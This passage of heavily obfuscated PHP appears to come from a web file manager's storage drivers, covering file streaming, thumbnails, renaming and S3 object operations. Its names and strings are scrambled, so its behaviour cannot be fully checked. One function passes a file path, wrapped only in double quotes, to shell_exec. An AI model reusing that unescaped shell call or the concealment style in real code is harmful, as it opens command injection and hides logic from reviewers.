$ñÆ´Éª, 3600); } if ($ñÆ´Éª == $™ò¶ø[104]) { return !1; } $©èÜÑï = shell_exec($ñÆ´Éª . "\x20\x22{$ıÄ¡ßå°}\42"); $©èÜÑï = str_replace($™ò¶ø[105], $™ò¶ø[12], $©èÜÑï); return substr($©èÜÑï, 0, 32); } public function link($¢à£±•™) { return $¢à£±•™; } public function fileOut($²ˆî©ƒ, $¼’¥§ıÄ = false, $†Ş¯Ÿ¬ = false, $õù©Ú¸ù = '') { $¾‚Ù½ÕÎ =& $_SERVER[ê‘³Æ±]; $this->cacheMethod(null, null); if (!$²ˆî©ƒ || !$this->exist($²ˆî©ƒ)) { show_json(LNG($¾‚Ù½ÕÎ[106]), !1, $†Ş¯Ÿ¬); } $îÎ¯ŸÈ = $this->getType() == $¾‚Ù½ÕÎ[107]; $ñ›ÃÅ–© = $GLOBALS[$¾‚Ù½ÕÎ[6]][$¾‚Ù½ÕÎ[90]][$¾‚Ù½ÕÎ[108]][$¾‚Ù½ÕÎ[109]]; $ıÛÜÛ´ = (double) $GLOBALS[$¾‚Ù½ÕÎ[6]][$¾‚Ù½ÕÎ[90]][$¾‚Ù½ÕÎ[108]][$¾‚Ù½ÕÎ[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¬Ù–Çç¢ = $this->infoFull($²ˆî©ƒ); $éØ¬¸ = $¬Ù–Çç¢[$¾‚Ù½ÕÎ[80]]; $®¹ÚÇÙ = gmdate($¾‚Ù½ÕÎ[111], $¬Ù–Çç¢[$¾‚Ù½ÕÎ[86]]); $©ƒ‚ØĞş = $†Ş¯Ÿ¬ ? $†Ş¯Ÿ¬ : $this->iconvApp($¬Ù–Çç¢[$¾‚Ù½ÕÎ[32]]); $Š“û´àœ = 0; $Ç˜Ì† = $éØ¬¸ - 1; $”¹³™Š = $this->ext($©ƒ‚ØĞş); if (in_array($”¹³™Š, array($¾‚Ù½ÕÎ[112], $¾‚Ù½ÕÎ[113], $¾‚Ù½ÕÎ[114], $¾‚Ù½ÕÎ[115]))) { $”¹³™Š = $¾‚Ù½ÕÎ[116]; } if (in_array($”¹³™Š, array($¾‚Ù½ÕÎ[117]))) { $”¹³™Š = $¾‚Ù½ÕÎ[118]; } if (!$õù©Ú¸ù) { $õù©Ú¸ù = md5($®¹ÚÇÙ . $this->hashSimple($²ˆî©ƒ)); } $õù©Ú¸ù = $¾‚Ù½ÕÎ[119] . $õù©Ú¸ù . $¾‚Ù½ÕÎ[119]; $©ğı´ò» = get_file_mime($”¹³™Š); if ($¼’¥§ıÄ === !1 && !mime_support($©ğı´ò»)) { $©ğı´ò» = $¾‚Ù½ÕÎ[120]; } header($¾‚Ù½ÕÎ[121]); header($¾‚Ù½ÕÎ[122] . $©ğı´ò»); $Íç©ïõ¹ = rawurlencode($©ƒ‚ØĞş); $Íç©ïõ¹ = $¾‚Ù½ÕÎ[119] . $Íç©ïõ¹ . $¾‚Ù½ÕÎ[123] . $Íç©ïõ¹; if ($¼’¥§ıÄ) { header($¾‚Ù½ÕÎ[124]); header($¾‚Ù½ÕÎ[125] . $Íç©ïõ¹); } else { } header($¾‚Ù½ÕÎ[126] . gmdate($¾‚Ù½ÕÎ[111], time() + 3600 * 24 * 30) . $¾‚Ù½ÕÎ[127]); header($¾‚Ù½ÕÎ[128]); header($¾‚Ù½ÕÎ[129]); header($¾‚Ù½ÕÎ[130]); if (isset($_SERVER[$¾‚Ù½ÕÎ[131]]) && strtotime($_SERVER[$¾‚Ù½ÕÎ[131]]) == $¬Ù–Çç¢[$¾‚Ù½ÕÎ[86]]) { header($¾‚Ù½ÕÎ[132], !0, 304); die; } if (isset($_SERVER[$¾‚Ù½ÕÎ[133]]) && $_SERVER[$¾‚Ù½ÕÎ[133]] == $õù©Ú¸ù) { header($¾‚Ù½ÕÎ[134] . $õù©Ú¸ù, !0, 304); die; } header($¾‚Ù½ÕÎ[134] . $õù©Ú¸ù); header($¾‚Ù½ÕÎ[135] . $®¹ÚÇÙ . $¾‚Ù½ÕÎ[127]); header($¾‚Ù½ÕÎ[136] . $©ƒ‚ØĞş); header($¾‚Ù½ÕÎ[137]); header($¾‚Ù½ÕÎ[138] . $éØ¬¸); header($¾‚Ù½ÕÎ[139]); if (!$¼’¥§ıÄ && $”¹³™Š == $¾‚Ù½ÕÎ[140]) { if ($éØ¬¸ > 1024 * 1024 * 5) { die; } $Šéª„æù = $this->getContent($²ˆî©ƒ); $Šéª„æù = Html::clearSVG($Šéª„æù); header($¾‚Ù½ÕÎ[141] . strlen($Šéª„æù)); echo $Šéª„æù; die; } $˜›Î…ı = strtolower($_SERVER[$¾‚Ù½ÕÎ[142]]); if ($îÎ¯ŸÈ && $˜›Î…ı && $ñ›ÃÅ–©) { if (strstr($˜›Î…ı, $¾‚Ù½ÕÎ[143])) { header($¾‚Ù½ÕÎ[144] . $²ˆî©ƒ); } else { if (strstr($˜›Î…ı, $¾‚Ù½ÕÎ[145])) { header($¾‚Ù½ÕÎ[146] . $²ˆî©ƒ); } else { if (strstr($˜›Î…ı, $¾‚Ù½ÕÎ[147])) { header($¾‚Ù½ÕÎ[148] . $²ˆî©ƒ); } } } if ($ıÛÜÛ´) { header($¾‚Ù½ÕÎ[149] . $ıÛÜÛ´); } return; } if (isset($_SERVER[$¾‚Ù½ÕÎ[150]])) { if (preg_match($¾‚Ù½ÕÎ[151], $_SERVER[$¾‚Ù½ÕÎ[150]], $ì‡Æå–)) { $Š“û´àœ = intval($ì‡Æå–[1]); if (!empty($ì‡Æå–[2])) { $Ç˜Ì† = intval($ì‡Æå–[2]); } } header($¾‚Ù½ÕÎ[152]); header("\x43\x6f\156\x74\x65\156\x74\55\122\141\156\x67\145\72\40\142\171\164\x65\163\40{$Š“û´àœ}\x2d{$Ç˜Ì†}\x2f" . $éØ¬¸); } else { header($¾‚Ù½ÕÎ[153]); } header($¾‚Ù½ÕÎ[154]); $‰Ÿ‰ê‚› = !0; if ($_SERVER[$¾‚Ù½ÕÎ[155]] == $¾‚Ù½ÕÎ[156] && $éØ¬¸ > 1204 * 1024 * 1024 * 2) { $‰Ÿ‰ê‚› = !1; } if ($‰Ÿ‰ê‚›) { header($¾‚Ù½ÕÎ[157] . ($Ç˜Ì† - $Š“û´àœ + 1)); } if ($_SERVER[$¾‚Ù½ÕÎ[158]] == $¾‚Ù½ÕÎ[159]) { return; } $ï‡Üµ… = 1024 * 100; $ÎÆúØ¶Ü = 0; if ($ıÛÜÛ´) { $ÎÆúØ¶Ü = intval(1000 * 1000 * ($ï‡Üµ… / $ıÛÜÛ´)); } while ($Š“û´àœ <= $Ç˜Ì†) { $§Ø§ş´ = timeFloat(); check_abort(); $•È«¯€ = $Ç˜Ì† - $Š“û´àœ + 1; if ($•È«¯€ <= $ï‡Üµ…) { $ï‡Üµ… = $•È«¯€; } echo $this->fileSubstr($²ˆî©ƒ, $Š“û´àœ, $ï‡Üµ…); $Š“û´àœ += $ï‡Üµ…; if ($ï‡Üµ… == $•È«¯€) { $Š“û´àœ = $Ç˜Ì† + 1; } if ($ÎÆúØ¶Ü) { $ı³ÁÕÈ = intval(1000 * 1000 * (timeFloat() - $§Ø§ş´)); $œƒŸ¶ş = $ÎÆúØ¶Ü - $ı³ÁÕÈ; if ($œƒŸ¶ş > 5) { usleep($œƒŸ¶ş); } } } } public function fileOutServer($ŞûçèÓ, $œ¸éòË¼ = false, $ ‡”ì«ë = false, $›õÊ°ë = '') { $this->fileOut($ŞûçèÓ, $œ¸éòË¼, $ ‡”ì«ë, $›õÊ°ë); } public function fileOutLink($ñïØÈÛÚ) { header($_SERVER[ê‘³Æ±][160] . $ñïØÈÛÚ); die; } public function cacheMethod($ûë•–¢Ó, $Óâ§ß¤, $ëÚ¦şÌô = null) { $•Ú¸œ´É =& $_SERVER[ê‘³Æ±]; static $Ç¨öÂ = array(); $„—¡ı–Ü = $Óâ§ß¤ ? ltrim($this->getPathOuter($Óâ§ß¤), $•Ú¸œ´É[8]) : $Óâ§ß¤; $¹à¾íÛÅ = $•Ú¸œ´É[161] . $ûë•–¢Ó . $•Ú¸œ´É[162] . rtrim($„—¡ı–Ü, $•Ú¸œ´É[8]); if (is_null($ûë•–¢Ó)) { $Ç¨öÂ = array(); return; } if (is_null($Óâ§ß¤)) { unset($Ç¨öÂ[$¹à¾íÛÅ]); return; } if (!is_null($ëÚ¦şÌô)) { $Ç¨öÂ[$¹à¾íÛÅ] = $ëÚ¦şÌô; return; } $–˜€èŸû = isset($Ç¨öÂ[$¹à¾íÛÅ]) ? $Ç¨öÂ[$¹à¾íÛÅ] : null; if (!is_null($–˜€èŸû)) { return $–˜€èŸû; } $–˜€èŸû = $this->{$ûë•–¢Ó}($Óâ§ß¤); $Ç¨öÂ[$¹à¾íÛÅ] = $–˜€èŸû; return $–˜€èŸû; } public function fileOutImage($Ÿñî…, $ÁçìÕñÁ = 250) { $ÍòªÃä‚ =& $_SERVER[ê‘³Æ±]; set_timeout(); if (substr($Ÿñî…, 0, 4) == $ÍòªÃä‚[147]) { $this->fileOutLink($Ÿñî…); } $ˆ“¿»Ÿà = $this->info($Ÿñî…); $‘ßú©–Â = $ˆ“¿»Ÿà[$ÍòªÃä‚[32]]; $ÊŞº³‹Ö = !1; if (isset($GLOBALS[$ÍòªÃä‚[163]]) && $GLOBALS[$ÍòªÃä‚[163]][$ÍòªÃä‚[78]] == $ˆ“¿»Ÿà[$ÍòªÃä‚[78]]) { $ÁÊ¡ò€è = $GLOBALS[$ÍòªÃä‚[163]][$ÍòªÃä‚[164]]; if (!$ˆ“¿»Ÿà[$ÍòªÃä‚[165]]) { $ˆ“¿»Ÿà[$ÍòªÃä‚[165]] = $GLOBALS[$ÍòªÃä‚[163]]; } if (isset($ÁÊ¡ò€è[$ÍòªÃä‚[166]])) { if ($ÁÊ¡ò€è[$ÍòªÃä‚[166]] <= $ÁçìÕñÁ && $ÁÊ¡ò€è[$ÍòªÃä‚[167]] <= $ÁçìÕñÁ) { $ÊŞº³‹Ö = !0; } } $‘ßú©–Â = $ˆ“¿»Ÿà[$ÍòªÃä‚[165]][$ÍòªÃä‚[32]]; } if ($ˆ“¿»Ÿà[$ÍòªÃä‚[80]] <= 1024 * 50 || $ÊŞº³‹Ö || !function_exists($ÍòªÃä‚[168]) || $ˆ“¿»Ÿà[$ÍòªÃä‚[169]] == $ÍòªÃä‚[170]) { return $this->fileOut($Ÿñî…, !1, $‘ßú©–Â); } if (isset($ˆ“¿»Ÿà[$ÍòªÃä‚[165]][$ÍòªÃä‚[171]])) { $ºÎôÍÌí = $ˆ“¿»Ÿà[$ÍòªÃä‚[165]][$ÍòªÃä‚[171]]; } else { if (isset($ˆ“¿»Ÿà[$ÍòªÃä‚[165]][$ÍòªÃä‚[172]])) { $ºÎôÍÌí = $ˆ“¿»Ÿà[$ÍòªÃä‚[165]][$ÍòªÃä‚[172]]; } else { $ºÎôÍÌí = md5("{$ˆ“¿»Ÿà[$ÍòªÃä‚[32]]}\x5f{$ˆ“¿»Ÿà[$ÍòªÃä‚[78]]}\137{$ˆ“¿»Ÿà[$ÍòªÃä‚[80]]}"); } } $šÙ™‘ø = "{$ºÎôÍÌí}\137{$ÁçìÕñÁ}\x2e\160\x6e\x67"; if (!($…ˆÆñ¤ç = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ÍòªÃä‚[173]))) { $ÇĞİ°Ï­ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ÍòªÃä‚[174]); } else { $ÇĞİ°Ï­ = KodIO::make($…ˆÆñ¤ç); } if ($…ˆÆñ¤ç = IO::fileNameExist($ÇĞİ°Ï­, $šÙ™‘ø)) { $¶—Ÿ¢„ = KodIO::make($…ˆÆñ¤ç); return IO::fileOut($¶—Ÿ¢„, !1, $‘ßú©–Â); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¶—Ÿ¢„ = DATA_THUMB . $šÙ™‘ø; del_file($¶—Ÿ¢„); if (!@file_exists($¶—Ÿ¢„)) { $èÎÖ±Ëä = TEMP_FILES; if (!is_dir($èÎÖ±Ëä)) { mk_dir($èÎÖ±Ëä); } $™ØÅ¤Â« = $èÎÖ±Ëä . $ºÎôÍÌí . $ÍòªÃä‚[10] . $ˆ“¿»Ÿà[$ÍòªÃä‚[169]]; if (!@file_exists($™ØÅ¤Â«)) { $™ØÅ¤Â« = $this->download($Ÿñî…, $™ØÅ¤Â«); } ImageThumb::createThumb($™ØÅ¤Â«, $¶—Ÿ¢„, $ÁçìÕñÁ, $ÁçìÕñÁ * 10); } if (!file_exists($¶—Ÿ¢„) || filesize($¶—Ÿ¢„) < 100) { return @file_exists($™ØÅ¤Â«) ? IO::fileOut($™ØÅ¤Â«) : $this->fileOut($Ÿñî…); } if (!($ÖÜÅÈóù = IO::move($¶—Ÿ¢„, $ÇĞİ°Ï­))) { return IO::fileOut($¶—Ÿ¢„); } del_file($¶—Ÿ¢„); IO::fileOut($ÖÜÅÈóù); } public function fileOutImageServer($Ó³¯·õ½, $Úòí…•Ë = 250) { $this->fileOutImage($Ó³¯·õ½, $Úòí…•Ë); } public function fileNameAuto($õ¥™Ëµ, $Æ¼ÄÜçÄ, $™ŠıŒÌÈ = REPEAT_RENAME, $»†Ú­í = false) { $ºö¢Ó‘ =& $_SERVER[ê‘³Æ±]; $¨ûÙ–ÈÂ = $õ¥™Ëµ === $ºö¢Ó‘[12] ? $Æ¼ÄÜçÄ : rtrim($õ¥™Ëµ, $ºö¢Ó‘[8]) . $ºö¢Ó‘[8] . $Æ¼ÄÜçÄ; if ($™ŠıŒÌÈ == REPEAT_REPLACE || !$this->exist($¨ûÙ–ÈÂ) || $»†Ú­í && $™ŠıŒÌÈ != REPEAT_RENAME_FOLDER) { return $Æ¼ÄÜçÄ; } if ($™ŠıŒÌÈ == REPEAT_SKIP) { return !1; } $¿™¸×Ÿ = $ºö¢Ó‘[10] . get_path_ext($Æ¼ÄÜçÄ); $¿™¸×Ÿ = $¿™¸×Ÿ == $ºö¢Ó‘[10] || $»†Ú­í ? $ºö¢Ó‘[12] : $¿™¸×Ÿ; $Í—®æşÜ = 1; $Ê•óÊÓŞ = substr($Æ¼ÄÜçÄ, 0, strlen($Æ¼ÄÜçÄ) - strlen($¿™¸×Ÿ)); $ĞğæìêÑ = $Ê•óÊÓŞ . "\x28{$Í—®æşÜ}\x29{$¿™¸×Ÿ}"; while ($this->exist(rtrim($õ¥™Ëµ, $ºö¢Ó‘[8]) . $ºö¢Ó‘[8] . $ĞğæìêÑ)) { $ĞğæìêÑ = $Ê•óÊÓŞ . "\50{$Í—®æşÜ}\x29{$¿™¸×Ÿ}"; $Í—®æşÜ++; } return $ĞğæìêÑ; } private function fileNameAutoList($¤İõ‡—×, $‹ğñößˆ, $¾ú‚·ã€ = false) { $ş½è¡Ô§ =& $_SERVER[ê‘³Æ±]; $÷ÎíéÏÈ = $this->listPath($¤İõ‡—×, !0); $÷ÎíéÏÈ = array_merge($÷ÎíéÏÈ[$ş½è¡Ô§[77]], $÷ÎíéÏÈ[$ş½è¡Ô§[76]]); $ÅŠíÉ«ı = array_to_keyvalue($÷ÎíéÏÈ, $ş½è¡Ô§[12], $ş½è¡Ô§[32]); $±¿±µœ = $ş½è¡Ô§[10] . get_path_ext($‹ğñößˆ); $±¿±µœ = $±¿±µœ == $ş½è¡Ô§[10] || $¾ú‚·ã€ ? $ş½è¡Ô§[12] : $±¿±µœ; $¥Ì«Ë­ = substr($‹ğñößˆ, 0, strlen($‹ğñößˆ) - strlen($±¿±µœ)); $Á“È€§ = $¥Ì«Ë­ . "\x28\60\x29{$±¿±µœ}"; for ($ƒ¹­ººĞ = 1; $ƒ¹­ººĞ <= count($ÅŠíÉ«ı) + 1; $ƒ¹­ººĞ++) { $Á“È€§ = $¥Ì«Ë­ . "\50{$ƒ¹­ººĞ}\51{$±¿±µœ}"; if (!in_array_not_case($Á“È€§, $ÅŠíÉ«ı)) { return $Á“È€§; } } return $Á“È€§; } public function listAllFiles($²Ú–«è, $êæûÄ€ê, $Ï¤ü¶¿ = array()) { $œá›—Êİ =& $_SERVER[ê‘³Æ±]; if (empty($êæûÄ€ê)) { return array(); } $»ôÎ÷‘û = array(); $²Ú–«è = trim($²Ú–«è, $œá›—Êİ[8]); foreach ($êæûÄ€ê as $øªŠ€ô) { $ÔèÈ²¯¤ = ltrim(substr(trim($øªŠ€ô, $œá›—Êİ[8]), strlen($²Ú–«è)), $œá›—Êİ[8]); $»ôÎ÷‘û = array_merge($»ôÎ÷‘û, $this->slicePath($ÔèÈ²¯¤)); } $üáèÎƒº = array(); foreach (array_unique($»ôÎ÷‘û) as $øªŠ€ô) { $Ô×¿üİª = array($œá›—Êİ[78] => $this->getPathOuter($œá›—Êİ[8] . $²Ú–«è . $œá›—Êİ[8] . $øªŠ€ô), $œá›—Êİ[79] => 1, $œá›—Êİ[80] => 0); if (substr($øªŠ€ô, -1) != $œá›—Êİ[8]) { $Ô×¿üİª[$œá›—Êİ[79]] = 0; $İí’íÑÃ = $this->getPath($²Ú–«è . $œá›—Êİ[8] . $øªŠ€ô); $Ô×¿üİª[$œá›—Êİ[80]] = isset($Ï¤ü¶¿[$İí’íÑÃ]) ? $Ï¤ü¶¿[$İí’íÑÃ] : $this->size($İí’íÑÃ); } $üáèÎƒº[] = $Ô×¿üİª; } return $üáèÎƒº; } public function slicePath($»Ÿ”–íÈ) { $‚Ì¬Ñä =& $_SERVER[ê‘³Æ±]; $Ó×ç– = explode($‚Ì¬Ñä[8], trim($»Ÿ”–íÈ, $‚Ì¬Ñä[8])); $ßâÖ¥Ùş = 0; do { ++$ßâÖ¥Ùş; $Æá›Ï’ş[] = implode($‚Ì¬Ñä[8], array_slice($Ó×ç–, 0, $ßâÖ¥Ùş)) . $‚Ì¬Ñä[8]; } while ($ßâÖ¥Ùş < count($Ó×ç–)); $Æá›Ï’ş[count($Ó×ç–) - 1] = $»Ÿ”–íÈ; return $Æá›Ï’ş; } public function getHost() { $Ê¦ÕŒ™® =& $_SERVER[ê‘³Æ±]; $§òµòúŞ = parse_url(trim($this->domain, $Ê¦ÕŒ™®[8])); $¶å•¼–Ç = isset($§òµòúŞ[$Ê¦ÕŒ™®[175]]) ? $§òµòúŞ[$Ê¦ÕŒ™®[175]] : http_type(); $“ØÃµíê = isset($§òµòúŞ[$Ê¦ÕŒ™®[176]]) ? $§òµòúŞ[$Ê¦ÕŒ™®[176]] : $§òµòúŞ[$Ê¦ÕŒ™®[78]]; if (isset($§òµòúŞ[$Ê¦ÕŒ™®[177]])) { $“ØÃµíê .= $Ê¦ÕŒ™®[4] . $§òµòúŞ[$Ê¦ÕŒ™®[177]]; } return $¶å•¼–Ç . $Ê¦ÕŒ™®[178] . $“ØÃµíê; } public function pathEncode($È¾ÆûğÃ) { $ö­Œ¨ƒ =& $_SERVER[ê‘³Æ±]; return str_replace($ö­Œ¨ƒ[179], $ö­Œ¨ƒ[8], rawurlencode($È¾ÆûğÃ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($ØŞ§äù) { set_timeout(); require_once SDK_DIR . $_SERVER[ê‘³Æ±][180]; parent::__construct(); $this->_init($ØŞ§äù); } public function _init($ã–´›å) { foreach ($ã–´›å as $¬ĞÓš => $ì»ìÜÌå) { if (isset($this->{$¬ĞÓš})) { $this->{$¬ĞÓš} = $ì»ìÜÌå; } } $this->endpoint = $ã–´›å[$_SERVER[ê‘³Æ±][181]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Øñ¾ğŒ“ = "\166\64") { $this->signVer = $Øñ¾ğŒ“; $this->client->setSignatureVersion($Øñ¾ğŒ“); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $üûîÉ‘Ú =& $_SERVER[ê‘³Æ±]; $—îÍ÷œı = $this->getBucketCors(); if (!$—îÍ÷œı || !is_array($—îÍ÷œı)) { return !1; } if ($—îÍ÷œı[$üûîÉ‘Ú[182]] != $üûîÉ‘Ú[183] || $—îÍ÷œı[$üûîÉ‘Ú[184]] != $üûîÉ‘Ú[183]) { return !1; } $ñê’‘œ± = array_map($üûîÉ‘Ú[185], $—îÍ÷œı[$üûîÉ‘Ú[186]]); if (!is_array($ñê’‘œ±)) { $ñê’‘œ± = array(); } $ª‡ü£ĞÜ = array($üûîÉ‘Ú[187], $üûîÉ‘Ú[188], $üûîÉ‘Ú[189], $üûîÉ‘Ú[190], $üûîÉ‘Ú[191]); $¿‹œ¡„’ = array_diff($ª‡ü£ĞÜ, $ñê’‘œ±); return empty($¿‹œ¡„’); } public function mkfile($úìÄ¶Û’, $«ËÚ¤èñ = '', $‚§¸Ìµ = REPEAT_RENAME) { $Ç•ùÃ¤× = $this->setContent($úìÄ¶Û’, $«ËÚ¤èñ); if ($Ç•ùÃ¤× !== !1) { return $this->getPathOuter($úìÄ¶Û’); } return !1; } public function mkdir($öÚÃ†¿, $¶æŸŠù = REPEAT_SKIP) { $Ôšìş™ =& $_SERVER[ê‘³Æ±]; if (empty($öÚÃ†¿) && $öÚÃ†¿ !== $Ôšìş™[192]) { return !1; } if ($this->_isFolder($öÚÃ†¿)) { return $this->getPathOuter($öÚÃ†¿); } $„¤­Ğ€İ = $this->setContent($öÚÃ†¿, $Ôšìş™[12], !0); if ($„¤­Ğ€İ !== !1) { return $this->getPathOuter($öÚÃ†¿); } return !1; } public function copyFile($™€à À´, $Í…¹ŞÙ, $½¼Ø‡† = array()) { $Şùì×ø =& $_SERVER[ê‘³Æ±]; $ÍøÂ§º = $this->objectMeta($™€à À´); if (!$ÍøÂ§º) { return !1; } if ($ÍøÂ§º[$Şùì×ø[80]] <= 1024 * 1024 * 200) { $¡‚‘ÇŠŸ = $this->client->copyObject($this->bucket, $™€à À´, $this->bucket, $Í…¹ŞÙ, $Şùì×ø[193], $½¼Ø‡†); } else { $¡‚‘ÇŠŸ = $this->client->multiCopyObject($this->bucket, $™€à À´, $this->bucket, $Í…¹ŞÙ, $½¼Ø‡†); } $¡‚‘ÇŠŸ = $¡‚‘ÇŠŸ ? $this->getPathOuter($Í…¹ŞÙ) : !1; return $¡‚‘ÇŠŸ; } public function moveFile($Í˜ÃşåÚ, $õ‹‰ùñ­) { if ($this->copyFile($Í˜ÃşåÚ, $õ‹‰ùñ­)) { $this->delFile($Í˜ÃşåÚ); return $this->getPathOuter($õ‹‰ùñ­); } return !1; } public function delFile($‚ËùŸóœ) { return $this->client->deleteObject($this->bucket, $‚ËùŸóœ); } public function delFolder($óˆùå ) { $ŸÒÑ€ˆ„ =& $_SERVER[ê‘³Æ±]; if (!$this->exist($óˆùå )) { return !0; } $this->listItemCache = !1; $ıÓÓíÑÖ = $this->fileList($óˆùå ); $this->listItemCache = !0; $üš†›µà = trim($óˆùå , $ŸÒÑ€ˆ„[8]) . $ŸÒÑ€ˆ„[8]; if (!empty($óˆùå ) && $óˆùå  !== $ŸÒÑ€ˆ„[192] && !in_array($üš†›µà, $ıÓÓíÑÖ[$ŸÒÑ€ˆ„[77]])) { $ıÓÓíÑÖ[$ŸÒÑ€ˆ„[77]][] = $üš†›µà; } $ñŞñÂı = $this->delByBatch($ıÓÓíÑÖ[$ŸÒÑ€ˆ„[76]]); if (!$ñŞñÂı) { return !1; } $ñŞñÂı = $this->delByBatch($ıÓÓíÑÖ[$ŸÒÑ€ˆ„[77]]); if (!$ñŞñÂı) { return !1; } return $this->delFile($üš†›µà); } private function delByBatch($ÉÑ†¾ÁÂ) { foreach (array_chunk($ÉÑ†¾ÁÂ, 1000) as $ÒªºšÓ) { $½ƒÚ½ = $this->client->deleteObjects($this->bucket, $ÒªºšÓ); if (!$½ƒÚ½) { return !1; } } return !0; } public function rename($±«ª‡¬Ö, $‹ŞÊ§Åú) { return $this->renameObject($±«ª‡¬Ö, $‹ŞÊ§Åú); } public function listPath($ó‰ŠÃğ, $¡©Õ¿Ò¯ = false) { $ÑÇË =& $_SERVER[ê‘³Æ±]; $ºíÉî„ƒ = $this->fileList($ó‰ŠÃğ, $ÑÇË[8], !0); foreach ($ºíÉî„ƒ[$ÑÇË[77]] as $Ø€şÕ“ë => $¨ŞÇÄÚª) { $ºíÉî„ƒ[$ÑÇË[77]][$Ø€şÕ“ë] = $this->folderInfo($¨ŞÇÄÚª, $¡©Õ¿Ò¯); } foreach ($ºíÉî„ƒ[$ÑÇË[76]] as $Ø€şÕ“ë => $¨ŞÇÄÚª) { $ºíÉî„ƒ[$ÑÇË[76]][$Ø€şÕ“ë] = $this->fileInfo($¨ŞÇÄÚª[$ÑÇË[32]], $¡©Õ¿Ò¯, $¨ŞÇÄÚª); } return $ºíÉî„ƒ; } private function fileInfo($Èƒ§Í¯ï, $•Èä­™í = false, $‹èç¡ù¥ = array()) { $Ç×§Ã³ =& $_SERVER[ê‘³Æ±]; $¥‹‚´ßê = array($Ç×§Ã³[32] => $this->pathThis($Èƒ§Í¯ï), $Ç×§Ã³[78] => $this->getPathOuter($Èƒ§Í¯ï), $Ç×§Ã³[33] => $Ç×§Ã³[194], $Ç×§Ã³[169] => $this->ext($Èƒ§Í¯ï), $Ç×§Ã³[80] => isset($‹èç¡ù¥[$Ç×§Ã³[80]]) ? $‹èç¡ù¥[$Ç×§Ã³[80]] : 0); if ($•Èä­™í) { return $¥‹‚´ßê; } $¥‹‚´ßê[$Ç×§Ã³[195]] = $¥‹‚´ßê[$Ç×§Ã³[86]] = 0; $¥‹‚´ßê[$Ç×§Ã³[196]] = $¥‹‚´ßê[$Ç×§Ã³[197]] = !0; if (empty($‹èç¡ù¥)) { $‹èç¡ù¥ = $this->objectMeta($Èƒ§Í¯ï); if (!$‹èç¡ù¥) { return $¥‹‚´ßê; } } if (isset($‹èç¡ù¥[$Ç×§Ã³[198]])) { $¥‹‚´ßê[$Ç×§Ã³[86]] = $‹èç¡ù¥[$Ç×§Ã³[198]]; } if (isset($‹èç¡ù¥[$Ç×§Ã³[80]])) { $¥‹‚´ßê[$Ç×§Ã³[80]] = $‹èç¡ù¥[$Ç×§Ã³[80]]; } return $¥‹‚´ßê; } private function folderInfo($Úñšºê«, $şÙ×Š¢’ = false) { $±µ¬‡áœ =& $_SERVER[ê‘³Æ±]; $±’êğ‰¶ = array($±µ¬‡áœ[32] => $this->pathThis($Úñšºê«), $±µ¬‡áœ[78] => $this->getPathOuter($±µ¬‡áœ[8] . $Úñšºê«), $±µ¬‡áœ[33] => $±µ¬‡áœ[79]); if ($şÙ×Š¢’) { return $±’êğ‰¶; } $±’êğ‰¶[$±µ¬‡áœ[195]] = $±’êğ‰¶[$±µ¬‡áœ[86]] = 0; $±’êğ‰¶[$±µ¬‡áœ[196]] = $±’êğ‰¶[$±µ¬‡áœ[197]] = !0; if ($Úñšºê« == $±µ¬‡áœ[12]) { return $±’êğ‰¶; } $Úñšºê« = trim($Úñšºê«, $±µ¬‡áœ[8]) . $±µ¬‡áœ[8]; $¬óøã…§ = $this->objectMeta($Úñšºê«); if (isset($¬óøã…§[$±µ¬‡áœ[198]])) { $±’êğ‰¶[$±µ¬‡áœ[195]] = $¬óøã…§[$±µ¬‡áœ[198]]; } return $±’êğ‰¶; } private function fileList($™ĞìçòÍ, $ÍşãÃ˜Ğ = '', $±ùÖ³Íç = 0) { $ù¯ƒµİÄ =& $_SERVER[ê‘³Æ±]; $¹Ì¶·š¹ = rtrim($™ĞìçòÍ, $ù¯ƒµİÄ[8]) . $ù¯ƒµİÄ[8]; $›°çÛä§ = $this->listObjs($¹Ì¶·š¹, null, null, $ÍşãÃ˜Ğ); if (!$›°çÛä§) { return array($ù¯ƒµİÄ[77] => array(), $ù¯ƒµİÄ[76] => array()); } $¾âúœ®® = $this->listItemCache === !1 ? !1 : !0; $›Šå½í = $ØÆûÃ£¼ = array(); foreach ($›°çÛä§[$ù¯ƒµİÄ[199]] as $ºŞìæœ) { $¶ÏÊ½£¤ = $ºŞìæœ[$ù¯ƒµİÄ[32]]; if ($¶ÏÊ½£¤ == $¹Ì¶·š¹) { continue; } $ŞÄïÓì = isset($ºŞìæœ[$ù¯ƒµİÄ[80]]) ? $ºŞìæœ[$ù¯ƒµİÄ[80]] : 0; $­Åğ±Æ = $ŞÄïÓì == 0 && substr($¶ÏÊ½£¤, strlen($¶ÏÊ½£¤) - 1, 1) == $ù¯ƒµİÄ[8] ? !0 : !1; if ($¾âúœ®®) { $this->cacheMethod($ù¯ƒµİÄ[200], $¶ÏÊ½£¤, $­Åğ±Æ); $this->cacheMethod($ù¯ƒµİÄ[201], $¶ÏÊ½£¤, $ºŞìæœ); } if ($­Åğ±Æ) { $›Šå½í[] = $¶ÏÊ½£¤; continue; } $ØÆûÃ£¼[] = $±ùÖ³Íç ? $ºŞìæœ : $¶ÏÊ½£¤; } foreach ($›°çÛä§[$ù¯ƒµİÄ[202]] as $ºŞìæœ) { $›Šå½í[] = $ºŞìæœ[$ù¯ƒµİÄ[32]]; if ($¾âúœ®®) { $this->cacheMethod($ù¯ƒµİÄ[200], $ºŞìæœ[$ù¯ƒµİÄ[32]], !0); } } if ($¾âúœ®®) { $this->cacheMethod($ù¯ƒµİÄ[200], $™ĞìçòÍ, !0); } return array($ù¯ƒµİÄ[77] => $›Šå½í, $ù¯ƒµİÄ[76] => $ØÆûÃ£¼); } private function listObjs($á¢÷¹, $§ŞüÀ£Î = null, $›ÔñïØÉ = null, $Á®·½¶ø 